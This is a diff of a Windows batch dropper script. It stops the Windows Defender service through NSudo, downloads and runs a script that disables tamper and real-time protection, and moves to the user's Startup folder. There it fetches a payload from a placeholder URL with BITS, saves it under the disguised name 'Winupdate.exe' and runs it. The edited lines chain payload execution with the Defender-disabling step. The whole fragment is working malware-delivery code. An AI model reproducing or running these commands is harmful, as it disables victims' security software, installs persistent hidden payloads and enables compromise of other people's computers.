@@ -83,11 +83,11 @@ NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend
 
 bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Disable-Tamper-Realtime-Protection/main/Disable-Tamper.cmd  %temp%\Disable-Tamper.cmd
 
-Disable-Tamper.cmd
+
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"
 
-start Winupdate.exe
+start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
